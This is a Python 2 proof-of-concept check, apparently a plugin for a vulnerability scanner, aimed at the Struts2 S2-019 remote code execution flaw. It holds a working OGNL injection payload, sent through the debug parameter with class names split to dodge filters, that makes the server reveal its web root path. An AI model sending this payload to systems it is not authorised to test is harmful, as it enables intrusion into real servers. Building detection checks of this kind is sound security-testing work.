#coding=utf-8
import requests
from lib import ttlscanlogger

def POC_INFO():
	dict_poc={};
	dict_poc["name"]="Struts2_019 RCE"
	dict_poc["Chinese_name"]="Struts2_019 远程命令执行漏洞"
	dict_poc["author"]="跳跳龙"
	return dict_poc

def POC(target_url):
    try:
        poc = "?debug=command&expression=%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22pathtiaotiaolong_019:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()"
        poc_url = target_url + poc
        response = requests.get(url=poc_url,timeout=0.5)

        result = response.text.encode('utf-8')

        if 'tiaotiaolong_019' in result:
            if len(result) < 100:
            	ttlscanlogger.logger.error("[+]Vuln: {0} has found Struts2_019 vulnerabillity ".format(target_url))
                return True
            else:
                return False
        else:
            return False
    except Exception, e:
    	return False



